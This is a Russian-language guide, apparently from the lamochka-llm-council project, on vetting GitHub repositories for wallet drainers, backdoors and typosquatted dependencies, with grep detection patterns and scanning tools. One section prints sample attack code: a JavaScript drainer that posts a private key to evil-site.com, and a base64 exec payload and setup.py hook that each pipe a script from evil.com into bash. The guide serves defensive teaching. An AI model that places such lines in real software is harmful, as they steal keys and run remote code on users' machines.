# 🔒 Как проверить GitHub репозиторий на безопасность

Перед тем как клонировать и запускать чужой код — проверь его. Этот гайд научит тебя находить дрейнеры, бэкдоры и другую грязь.

---

## 🚨 Красные флаги (сразу закрывай)

| Флаг | Почему опасно |
|------|---------------|
| Репо создано < 1 месяца назад | Скам-репо часто свежие |
| 0-5 звёзд, 0 форков | Никто не проверял |
| Один коммит "Initial commit" | Залили и забыли (или специально) |
| Обфусцированный код | `eval(atob("..."))`, `exec(base64.decode(...))` |
| Подозрительные домены в коде | Неизвестные API endpoints |
| Запрос приватных ключей | `private_key`, `seed_phrase`, `mnemonic` в коде |

---

## ✅ Чеклист проверки (делай перед каждым clone)

### 1. Проверь репутацию

```bash
# Открой в браузере и посмотри:
# - Сколько звёзд/форков?
# - Когда создан репо?
# - Кто автор? Есть другие репо?
# - Есть ли Issues/Discussions?
```

### 2. Поищи хардкод секретов (НЕ должно быть)

```bash
# Клонируй БЕЗ запуска
git clone --depth 1 <repo-url>
cd <repo>

# Ищи API ключи, приватные ключи, seed фразы
grep -r "sk-" . --include="*.py" --include="*.js" --include="*.ts"
grep -r "0x[a-fA-F0-9]\{64\}" . --include="*.py" --include="*.js"  # Приватные ключи ETH
grep -r "private_key\|seed_phrase\|mnemonic" . --include="*.py" --include="*.js"
grep -ri "api_key.*=.*['\"][a-zA-Z0-9]" . --include="*.py" | grep -v "example\|xxx\|your"
```

### 3. Проверь подозрительные паттерны (ДРЕЙНЕРЫ)

```bash
# Обфускация — главный признак дрейнера
grep -rE "eval\(|exec\(|compile\(" . --include="*.py"
grep -rE "atob\(|btoa\(|fromCharCode" . --include="*.js"
grep -rE "base64\.b64decode|codecs\.decode" . --include="*.py"

# Подозрительные сетевые запросы
grep -rE "requests\.(get|post)\(|fetch\(|axios\." . --include="*.py" --include="*.js" | head -20

# Wallet interactions — проверь что делает
grep -ri "eth_sendTransaction\|signTransaction\|transfer\(" . --include="*.py" --include="*.js"
grep -ri "window\.ethereum\|web3\|ethers" . --include="*.js" --include="*.ts"
```

### 4. Проверь зависимости

```bash
# Смотри requirements.txt / package.json
cat requirements.txt 2>/dev/null
cat package.json 2>/dev/null | grep -A 50 "dependencies"

# Подозрительные пакеты (typosquatting)
# Пример: "web3" ✅ vs "web33" ❌, "ethereum" ✅ vs "etherium" ❌
```

### 5. Проверь .env.example

```bash
# Должны быть ТОЛЬКО плейсхолдеры, НЕ реальные ключи
cat .env.example

# ✅ Хорошо: OPENAI_API_KEY=sk-xxx
# ❌ Плохо:  OPENAI_API_KEY=sk-proj-abc123realkey...
```

### 6. Проверь install/setup скрипты

```bash
# Скрипты могут выполнять что угодно!
cat setup.sh
cat install.sh
cat postinstall.js 2>/dev/null

# Ищи подозрительное:
grep -E "curl.*\|.*sh|wget.*\|.*bash|rm -rf|chmod 777" setup.sh install.sh 2>/dev/null
```

---

## 🔍 Пример: Проверка lamochka-llm-council

```bash
# 1. Клонируем
git clone --depth 1 https://github.com/lamawuf/lamochka-llm-council.git
cd lamochka-llm-council

# 2. Ищем хардкод ключи
grep -r "sk-" . --include="*.py"
# Результат: пусто ✅

# 3. Ищем обфускацию
grep -rE "eval\(|exec\(|base64\.b64decode" . --include="*.py"
# Результат: пусто ✅

# 4. Ищем wallet/crypto операции
grep -ri "private_key\|seed_phrase\|eth_send" . --include="*.py"
# Результат: пусто ✅

# 5. Проверяем .env.example
cat .env.example | grep "API_KEY"
# OPENROUTER_API_KEY=sk-or-v1-xxx  ← плейсхолдер ✅
# OPENAI_API_KEY=sk-xxx            ← плейсхолдер ✅

# 6. Проверяем setup.sh
cat setup.sh | grep -E "curl|wget|rm -rf"
# Результат: пусто ✅

# 7. Смотрим что в .gitignore (должен исключать .env)
grep "\.env" .gitignore
# .env ✅
```

**Вердикт: ✅ Безопасно**

---

## 🦠 Примеры вредоносного кода (как выглядит грязь)

### Дрейнер кошелька (JavaScript)

```javascript
// ❌ ОПАСНО — отправляет приватный ключ на сервер злоумышленника
const pk = window.ethereum.request({ method: 'eth_private_key' });
fetch('https://evil-site.com/steal', {
  method: 'POST',
  body: JSON.stringify({ key: pk })
});
```

### Обфусцированный payload (Python)

```python
# ❌ ОПАСНО — скрытый код
import base64
exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9ldmlsLmNvbS9zaGVsbC5zaCB8IGJhc2gnKQ=="))
# Декодируется в: import os; os.system('curl https://evil.com/shell.sh | bash')
```

### Typosquatting в зависимостях

```
# ❌ ОПАСНО — поддельные пакеты
requirements.txt:
  python-binance    ← настоящий
  python-binanace   ← ФЕЙК (typo: binanace)

  web3              ← настоящий
  web33             ← ФЕЙК
```

### Скрытый бэкдор в setup.py

```python
# ❌ ОПАСНО — выполняется при pip install
from setuptools import setup
import os
os.system('curl https://evil.com/backdoor.sh | bash')  # Бэкдор!
setup(name='innocent-package', ...)
```

---

## 🛡️ Безопасные практики

1. **Никогда не запускай код сразу** — сначала читай
2. **Используй виртуалку/контейнер** для подозрительных репо
3. **Проверяй автора** — есть ли история, другие проекты?
4. **Читай Issues** — часто там пишут если нашли грязь
5. **Форкни и проверь** — не клонируй напрямую если сомневаешься
6. **Никогда не вводи seed/private key** в чужой софт

---

## 🔧 Автоматические инструменты

```bash
# Trufflehog — ищет секреты в git истории
trufflehog git https://github.com/user/repo

# Gitleaks — сканер секретов
gitleaks detect --source .

# Bandit — анализ безопасности Python
pip install bandit
bandit -r . -ll

# npm audit — для JS проектов
npm audit
```

---

## Контакты

Нашёл дрейнер или подозрительный код?
- Сообщи в Issues репозитория
- Напиши автору
- Сообщи на платформу (GitHub abuse report)

---

*Этот гайд — часть проекта [lamochka-llm-council](https://github.com/lamawuf/lamochka-llm-council)*
